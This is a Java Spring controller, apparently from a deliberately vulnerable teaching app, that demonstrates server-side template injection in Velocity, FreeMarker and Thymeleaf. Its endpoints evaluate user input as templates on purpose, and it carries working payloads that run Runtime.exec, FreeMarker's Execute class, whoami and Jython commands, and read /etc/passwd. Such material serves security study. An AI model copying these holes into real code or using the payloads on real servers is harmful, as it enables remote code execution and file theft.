package org.joychou.controller;


import freemarker.cache.StringTemplateLoader;
import freemarker.core.TemplateClassResolver;
import freemarker.template.TemplateException;
import org.apache.velocity.Template;
import org.apache.velocity.VelocityContext;
import org.apache.velocity.app.VelocityEngine;
import org.apache.velocity.runtime.RuntimeConstants;
import org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.*;

import org.apache.velocity.app.Velocity;
//import org.thymeleaf.Thymeleaf;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.File;
import java.io.IOException;
import java.io.StringWriter;
import java.net.URISyntaxException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

//@RestController
@Controller 
@RequestMapping("/ssti")
public class SSTI {

    /**
     * SSTI of Java velocity. The latest Velocity version still has this problem.
     * Fix method: Avoid to use Velocity.evaluate method.
     * <p>
     * http://localhost:8080/ssti/velocity?template=%23set($e=%22e%22);$e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22open%20-a%20Calculator%22)
     * Open a calculator in MacOS.
     *
     * @param username exp
     */
    @GetMapping("/velocity")
//    public void velocity(String template, HttpServletRequest request, HttpServletResponse response) throws Exception {
    public void velocity(String username, HttpServletRequest request, HttpServletResponse response) throws Exception {
//    	String abc = "abc";
//    	response.getWriter().write(request.getParameter("username"));
        Velocity.init();
        VelocityContext context = new VelocityContext();
        context.put("author", "Elliot A.");
        context.put("address", "217 E Broadway");
        context.put("phone", "555-1337");

        StringWriter swOut = new StringWriter();
        Velocity.evaluate(context, swOut, "test", username);
        response.getWriter().write(swOut.toString());
    }

    @GetMapping("/enjoy")
    public void enjoy(String template) {
    }

    public static void freemarker_ssti_str() {
        StringWriter writer = new StringWriter();
        String content = "你的名字${name}";
        content = "<#assign value=\"freemarker.template.utility.Execute\"?new()>${value(\"calc.exe\")}";
//        content = "<#assign value=\"freemarker.template.utility.ObjectConstructor\"?new()>${value(\"java.lang.ProcessBuilder\",\"calc.exe\").start()}";
//        content = "<#assign classloader=object.class.protectionDomain.classLoader>"
//                + "<#assign owc=classloader.loadClass(\"freemarker.template.ObjectWrapper\")>"
//                + "<#assign dwf=owc.getField(\"DEFAULT_WRAPPER\").get(null)>"
//                + "<#assign ec=classloader.loadClass(\"freemarker.template.utility.Execute\")>"
//                + "${dwf.newInstance(ec,null)(\"whoami\")}";
//        content = "<#list .data_model as key, object_test>\n"
//                + "<b>Testing \"${key}\":</b><br/>\n"
//                + "<#attempt>\n"
//                + "<#assign classloader=object_test.class.protectionDomain.classLoader>\n"
//                + "<#assign owc=classloader.loadClass(\"freemarker.template.ObjectWrapper\")>\n"
//                + "<#assign dwf=owc.getField(\"DEFAULT_WRAPPER\").get(null)>\n"
//                + "<#assign ec=classloader.loadClass(\"freemarker.template.utility.Execute\")>\n"
//                + "(${dwf.newInstance(ec,null)(\"whoami\")})\n"
//                + "<#recover>failed\n"
//                + "</#attempt>\n"
//                + "<br/><br/></#list>";
//        content = "<#assign value=\"freemarker.template.utility.JythonRuntime\"?new()><@value>import os;os.system(\"calc.exe\")</@value>";
//        content = "<#assign classloader=name.class.protectionDomain.classLoader>\n"
//                + "<#assign owc=classloader.loadClass(\"freemarker.template.ObjectWrapper\")>";
//        content = "<#assign uri=object?api.class.getResource(\"/\").toURI()>\n"
//                + "<#assign input=uri?api.create(\"file:///etc/passwd\").toURL().openConnection()>\n"
//                + "<#assign is=input?api.getInputStream()>\n"
//                + "FILE:[<#list 0..999999999 as _>\n"
//                + "    <#assign byte=is.read()>\n"
//                + "    <#if byte == -1>\n"
//                + "        <#break>\n"
//                + "    </#if>\n"
//                + "${byte}, </#list>]";
//        content = "<#assign uri=object?api.class.getResource(\"/\").toURI()>\n";
//        content = "<#assign uri=object?api.class.getResource(\".\")>${uri}\n";
//        content = "<#assign uri=object.class?api.getResource(\".\")>${uri}\n";
//        Class.class.getClassLoader()
        freemarker.template.Configuration configuration = new freemarker.template.Configuration();
        StringTemplateLoader stringLoader = new StringTemplateLoader();
        stringLoader.putTemplate("contract", content);
        configuration.setTemplateLoader(stringLoader);
        configuration.setAPIBuiltinEnabled(true);//默认false
        configuration.setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_NOTHING_RESOLVER);//安全过滤
        try {
            freemarker.template.Template template = configuration.getTemplate("contract", "utf-8");
            Map<String, Object> root = new HashMap<String, Object>();
            root.put("name", "popko");
            root.put("object", new SSTI());
            template.process(root, writer);
        } catch (Exception e) {
            e.printStackTrace();
        }
        System.out.println(writer.toString());

    }

    public static void freemarker_ssti_file() {
        try {
            System.out.println(genFMTpl("fm1.tpl", null));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static String genFMTpl(String ftl, Map<String, Object> params)
            throws Exception {
        freemarker.template.Configuration configuration = new freemarker.template.Configuration();
//        configuration.setClassForTemplateLoading(SSTI.class, "/");
        configuration.setDirectoryForTemplateLoading(new File("src/main/resources/templates/fm/"));
        configuration.setDefaultEncoding("UTF-8");
//        configuration.setTemplateExceptionHandler(TemplateExceptionHandler.RETHROW_HANDLER);

        freemarker.template.Template template = configuration.getTemplate(ftl);
        java.io.Writer stringWriter = new StringWriter();

        template.process(params, stringWriter);

        return stringWriter.toString();
    }

    public static void velocity_ssti_str() {
        Velocity.init();
        VelocityContext context = new VelocityContext();
        context.put("author", "Elliot A.");
        context.put("address", "217 E Broadway");
        context.put("phone", "555-1337");

        StringWriter swOut = new StringWriter();
        String username = "#set($e=\"e\");$e.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"calc\")";
        Velocity.evaluate(context, swOut, "test", username);
//        System.out.println(swOut);
    }

    public static void velocity_ssti_file() {
        // 初始化模板引擎
        VelocityEngine ve = new VelocityEngine();
        ve.setProperty(RuntimeConstants.RESOURCE_LOADER, "classpath");
        ve.setProperty("classpath.resource.loader.class", ClasspathResourceLoader.class.getName());
        ve.init();
        // 获取模板文件
        Template t = ve.getTemplate("hellovelocity.vm");
        // 设置变量
        VelocityContext ctx = new VelocityContext();
        ctx.put("name", "Velocity");
        List<String> list = new ArrayList<String>();
        list.add("1");
        list.add("2");
        ctx.put("list", list);
        // 输出
        StringWriter sw = new StringWriter();
        t.merge(ctx, sw);
        System.out.println(sw.toString());
    }

    @RequestMapping("/thymeleaf_ssti_1")
    public String thymeleaf_ssti_1(String tplname) {
        if (tplname==null){
            tplname =  "thymeleaf_ssti_file";
        }
        return "qwe/"+tplname;
    }
//    @ResponseBody//预防
    @RequestMapping("/thymeleaf_ssti_2/{poc}")
    public void thymeleaf_ssti_2(@PathVariable String poc) {
        System.out.println("222");
    }
    @RequestMapping("/thymeleaf_ssti_3/{poc}")
    public String thymeleaf_ssti_3(@PathVariable String poc) {
        System.out.println("222");
        return "qwe";//string类型会设置为模板名,不存在漏洞
    }
    @RequestMapping("/thymeleaf_ssti_4/{poc}")
    public Object thymeleaf_ssti_4(@PathVariable String poc) {
        System.out.println("222");
        return new Page();//不是string,会解析路径作为模板名,存在漏洞
    }


    public static void main(String[] args) {
//    	ssti1();
//        ssti2();
//        freemarker_ssti_str();
//        velocity_ssti_str();
//        System.out.println("" instanceof String);
    }

}
class Page{

}